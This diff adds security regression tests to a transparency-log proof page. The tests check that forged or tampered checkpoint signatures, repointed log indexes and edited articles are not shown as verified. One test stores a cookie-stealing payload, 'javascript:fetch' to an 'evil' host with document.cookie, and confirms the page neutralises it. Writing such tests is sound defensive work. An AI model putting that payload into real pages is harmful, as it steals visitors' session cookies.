@@ -9,6 +9,7 @@ verifier checks.
 """
 
 import hashlib
+import hmac
 import html
 import re
 import subprocess
@@ -36,7 +37,7 @@ from src.transparency.log import (
     TransparencyBase,
     leaf_hash,
 )
-from src.transparency.proofs import inclusion_proof, proof_root, proof_steps
+from src.transparency.proofs import proof_root, proof_steps
 from src.transparency.store import latest_checkpoint_covering, save_checkpoint
 
 
@@ -125,6 +126,7 @@ async def _stamp_article(db_session, article, log):
         "fetched_at": article.fetched_at.isoformat(),
         "body_sha256": article.content_hash,
         "title": article.title,
+        "article_id": str(article.id),
     }
     entry = await log.append(payload)
     article.log_index = entry.index
@@ -132,10 +134,27 @@ async def _stamp_article(db_session, article, log):
     return entry
 
 
-async def _checkpoint_all(db_session, log, *, key_id="test-key"):
+async def _stamp_article_legacy(db_session, article, log):
+    """Stamp like the pre-binding locker did: no article_id in the payload."""
+    payload = {
+        "type": "rss_evidence",
+        "url": article.url,
+        "source_domain": article.source_domain,
+        "fetched_at": article.fetched_at.isoformat(),
+        "body_sha256": article.content_hash,
+        "title": article.title,
+    }
+    entry = await log.append(payload)
+    article.log_index = entry.index
+    await db_session.flush()
+    return entry
+
+
+async def _checkpoint_all(db_session, log, *, key_id="test-key", signer=None):
+    signer = signer or HmacDevSigner(SECRET, key_id=key_id)
     signed = sign_checkpoint(
         await build_checkpoint(log, await log.size()),
-        HmacDevSigner(SECRET, key_id=key_id),
+        signer,
     )
     await save_checkpoint(db_session, signed)
     await db_session.flush()
@@ -176,7 +195,17 @@ class TestProofSteps:
 
 
 class TestProofPage:
-    async def test_valid_proof_renders_verified(self, app_with_db, db_session):
+    async def test_dev_signed_checkpoint_renders_signature_unverified(
+        self, app_with_db, db_session
+    ):
+        """S-P1-1: a checkpoint signed by a key nobody published must never
+        render "Inclusion verified".
+
+        The HMAC dev signer proves nothing to a third party, and no trusted
+        keys are configured here, so the page renders the distinct
+        unverified-signature state: the math is shown (it is recomputable),
+        the "signed" claim is not made.
+        """
         log = SqlAlchemyMerkleLog(db_session)
         article = _make_article(db_session)
         entry = await _stamp_article(db_session, article, log)
@@ -188,19 +217,15 @@ class TestProofPage:
         response = client.get(f"/proof/{article.id}")
         assert response.status_code == 200
         body = response.text
-        assert "Inclusion verified" in body
+        assert "Inclusion verified" not in body
+        assert "signature unverified" in body
+        assert "does not verify against any published operator key" in body
+        # The math is still shown honestly: it is independently recomputable.
         assert entry.leaf_hash_hex in body
         assert signed.checkpoint.merkle_root.hex() in body
         assert "Recompute it yourself" in body
-        assert "sha256(0x01 || " in body
-        # The sibling hashes are on the page for hand verification.
-        proof = await inclusion_proof(log, entry.index, signed.checkpoint.tree_size)
-        for sibling in proof.siblings:
-            assert sibling.hex() in body
-        # Canonical payload shown so the leaf is recomputable.
-        assert "rss_evidence" in body
-        # Server-rendered: no JS needed for the proof content.
-        assert "canonical payload" in body.lower()
+        # The checklist names the signature check and marks it failed.
+        assert "Checkpoint signature verifies against a published key" in body
 
     async def test_printed_verify_recipe_actually_recomputes_a_level(
         self, app_with_db, db_session
@@ -415,3 +440,253 @@ class TestCheckpointStore:
 
         rows = await db_session.execute(select(RawArticle.log_index).where(RawArticle.id == article.id))
         assert rows.scalar_one() == 0
+
+
+class _TestMacSigner:
+    """Test-only signer/verifier pair standing in for a published operator key.
+
+    The `cryptography` package is not installed in the test env, so no real
+    ed25519 key can be minted here. This MAC pair exercises the request-path
+    logic under test -- key lookup, the verify_checkpoint call, the state the
+    page renders -- which is algorithm-agnostic. The ed25519 admission rule in
+    src/transparency/keys.py is covered separately in
+    tests/test_transparency_keys.py.
+    """
+
+    algorithm = "test-mac-v1"
+
+    def __init__(self, secret: bytes, key_id: str):
+        self._secret = secret
+        self.key_id = key_id
+
+    def sign(self, message: bytes) -> bytes:
+        return hmac.new(self._secret, message, hashlib.sha256).digest()
+
+    def verify(self, message: bytes, signature: bytes) -> bool:
+        return hmac.compare_digest(self.sign(message), signature)
+
+
+@pytest.fixture
+def trusted_test_key(monkeypatch):
+    """Pretend key id 'test-key-1' is a published operator key."""
+    signer = _TestMacSigner(b"test-trust-root-secret", "test-key-1")
+
+    def fake_verifier_for(signed, trusted):
+        if signed.key_id == signer.key_id and signed.algorithm == signer.algorithm:
+            return signer
+        return None
+
+    monkeypatch.setattr("curation_ui.proofs.verifier_for", fake_verifier_for)
+    return signer
+
+
+class TestSignatureVerification:
+    async def test_genuine_signature_renders_verified(
+        self, app_with_db, db_session, trusted_test_key
+    ):
+        """The only path to 'Inclusion verified': math checks out AND the
+        checkpoint signature verifies against a published key."""
+        log = SqlAlchemyMerkleLog(db_session)
+        article = _make_article(db_session)
+        entry = await _stamp_article(db_session, article, log)
+        signed = await _checkpoint_all(db_session, log, signer=trusted_test_key)
+        await db_session.commit()
+
+        body = TestClient(app_with_db).get(f"/proof/{article.id}").text
+        assert "Inclusion verified" in body
+        assert "signature verifies against the operator" in body.replace("&#x27;", "'")
+        assert entry.leaf_hash_hex in body
+        assert signed.checkpoint.merkle_root.hex() in body
+
+    async def test_forged_self_consistent_checkpoint_is_not_verified(
+        self, app_with_db, db_session, trusted_test_key
+    ):
+        """S-P1-1's attack, hand-crafted: a checkpoint row that is fully
+        self-consistent (correct root and chain over the real log) but signed
+        by an attacker's key. Before the fix this rendered 'Inclusion
+        verified'; now it must render the unverified-signature state."""
+        from src.transparency.checkpoint import build_checkpoint as _build
+
+        log = SqlAlchemyMerkleLog(db_session)
+        article = _make_article(db_session)
+        await _stamp_article(db_session, article, log)
+
+        attacker = _TestMacSigner(b"attacker-secret", "attacker-key")
+        forged = sign_checkpoint(await _build(log, await log.size()), attacker)
+        await save_checkpoint(db_session, forged)
+        await db_session.commit()
+
+        body = TestClient(app_with_db).get(f"/proof/{article.id}").text
+        assert "Inclusion verified" not in body
+        assert "signature unverified" in body
+        assert "attacker-key" in body
+        # The math is real (recomputable), only the "signed" claim is withheld.
+        assert "Recompute it yourself" in body
+
+    async def test_tampered_signature_is_not_verified(
+        self, app_with_db, db_session, trusted_test_key
+    ):
+        """A checkpoint signed by the right key but with a corrupted signature
+        must not verify."""
+        from src.transparency.checkpoint import SignedCheckpoint
+
+        log = SqlAlchemyMerkleLog(db_session)
+        article = _make_article(db_session)
+        await _stamp_article(db_session, article, log)
+        genuine = sign_checkpoint(
+            await build_checkpoint(log, await log.size()), trusted_test_key
+        )
+        bad = bytearray(genuine.signature)
+        bad[0] ^= 0xFF
+        tampered = SignedCheckpoint(
+            checkpoint=genuine.checkpoint,
+            signature=bytes(bad),
+            algorithm=genuine.algorithm,
+            key_id=genuine.key_id,
+        )
+        await save_checkpoint(db_session, tampered)
+        await db_session.commit()
+
+        body = TestClient(app_with_db).get(f"/proof/{article.id}").text
+        assert "Inclusion verified" not in body
+        assert "signature unverified" in body
+        assert "does not check out against the published public key" in body
+
+    async def test_newer_forged_checkpoint_does_not_displace_genuine(
+        self, app_with_db, db_session, trusted_test_key
+    ):
+        """An attacker inserting a newer self-consistent row must not hijack
+        the page: the view anchors to the newest *verifying* checkpoint."""
+        log = SqlAlchemyMerkleLog(db_session)
+        article = _make_article(db_session)
+        await _stamp_article(db_session, article, log)
+        await _checkpoint_all(db_session, log, signer=trusted_test_key)
+
+        attacker = _TestMacSigner(b"attacker-secret", "attacker-key")
+        forged = sign_checkpoint(await build_checkpoint(log, await log.size()), attacker)
+        await save_checkpoint(db_session, forged)
+        await db_session.commit()
+
+        body = TestClient(app_with_db).get(f"/proof/{article.id}").text
+        assert "Inclusion verified" in body
+        assert "test-key-1" in body
+
+
+class TestArticleBinding:
+    async def test_duplicate_log_index_is_rejected_by_the_database(self, db_session):
+        """S-P1-2's DB half: two articles cannot claim the same log entry."""
+        from sqlalchemy.exc import IntegrityError
+
+        log = SqlAlchemyMerkleLog(db_session)
+        a = _make_article(db_session, url="https://example.test/a")
+        b = _make_article(db_session, url="https://example.test/b")
+        await _stamp_article(db_session, a, log)
+        entry_b = await _stamp_article(db_session, b, log)
+        a.log_index = entry_b.index  # the repointing attack
+        with pytest.raises(IntegrityError):
+            await db_session.flush()
+
+    async def test_binding_verdict_rejects_entry_stamped_for_another_article(
+        self, db_session
+    ):
+        """Unit level: a payload naming article B cannot bind to article A."""
+        from curation_ui.proofs import _binding_verdict
+
+        article = _make_article(db_session, url="https://example.test/a")
+        payload = {"article_id": str(uuid.uuid4()), "url": article.url,
+                   "title": article.title, "body_sha256": article.content_hash}
+        bound, detail = _binding_verdict(payload, article)
+        assert bound is False
+        assert "not this article" in detail
+
+    async def test_edited_title_fails_binding(
+        self, app_with_db, db_session, trusted_test_key
+    ):
+        """The archived title/url/body are diffed against the article row: an
+        edit after stamping fails the proof instead of verifying."""
+        log = SqlAlchemyMerkleLog(db_session)
+        article = _make_article(db_session, title="Original headline")
+        await _stamp_article(db_session, article, log)
+        await _checkpoint_all(db_session, log, signer=trusted_test_key)
+        article.title = "Rewritten headline"
+        await db_session.commit()
+
+        body = TestClient(app_with_db).get(f"/proof/{article.id}").text
+        assert "Inclusion verified" not in body
+        assert "Verification failed" in body
+        assert "no longer match the article row" in body
+
+    async def test_legacy_entry_without_article_id_is_grandparented(
+        self, app_with_db, db_session, trusted_test_key
+    ):
+        """Entries stamped before article_id binding existed cannot prove the
+        cryptographic binding; the page discloses that and binds on the
+        archived url/title/body match instead of failing."""
+        log = SqlAlchemyMerkleLog(db_session)
+        article = _make_article(db_session)
+        await _stamp_article_legacy(db_session, article, log)
+        await _checkpoint_all(db_session, log, signer=trusted_test_key)
+        await db_session.commit()
+
+        body = TestClient(app_with_db).get(f"/proof/{article.id}").text
+        assert "Inclusion verified" in body
+        assert "legacy entry" in body
+
+    async def test_legacy_entry_with_changed_url_fails(
+        self, app_with_db, db_session, trusted_test_key
+    ):
+        """The legacy fallback is still a real check: changed fields fail."""
+        log = SqlAlchemyMerkleLog(db_session)
+        article = _make_article(db_session)
+        await _stamp_article_legacy(db_session, article, log)
+        await _checkpoint_all(db_session, log, signer=trusted_test_key)
+        article.url = "https://example.test/totally-different"
+        await db_session.commit()
+
+        body = TestClient(app_with_db).get(f"/proof/{article.id}").text
+        assert "Inclusion verified" not in body
+        assert "Verification failed" in body
+
+    async def test_checkpoint_chain_hash_mismatch_fails(
+        self, app_with_db, db_session, trusted_test_key
+    ):
+        """A checkpoint whose signature verifies but whose chain hash was not
+        computed from this log fails: the signature is over the body, so a
+        corrupted-then-signed body still verifies -- the chain fold catches
+        what the signature cannot."""
+        import dataclasses
+        from src.transparency.checkpoint import Checkpoint
+
+        log = SqlAlchemyMerkleLog(db_session)
+        article = _make_article(db_session)
+        await _stamp_article(db_session, article, log)
+        await _stamp_article(db_session, _make_article(db_session, url="https://example.test/b"), log)
+        checkpoint = await build_checkpoint(log, await log.size())
+        corrupted = dataclasses.replace(checkpoint, chain_hash=b"\x00" * 32)
+        assert isinstance(corrupted, Checkpoint)
+        await save_checkpoint(db_session, sign_checkpoint(corrupted, trusted_test_key))
+        await db_session.commit()
+
+        body = TestClient(app_with_db).get(f"/proof/{article.id}").text
+        assert "Inclusion verified" not in body
+        assert "Verification failed" in body
+        assert "chain does not reach this entry" in body or "different history" in body
+
+
+class TestStoredXssNeutralized:
+    async def test_javascript_url_renders_as_dead_link(self, app_with_db, db_session):
+        """S-P1-4: a feed-origin javascript: URL stored verbatim on the article
+        row must not become a script-execution link. The is_safe_url filter
+        (registered on the app's Jinja env) reduces it to '#'."""
+        article = _make_article(
+            db_session,
+            url="javascript:fetch('//evil/'+document.cookie)",
+            title="XSS headline",
+            log_index=None,
+        )
+        await db_session.commit()
+
+        body = TestClient(app_with_db).get(f"/proof/{article.id}").text
+        assert "XSS headline" in body
+        assert "javascript:" not in body
+        assert 'href="#"' in body
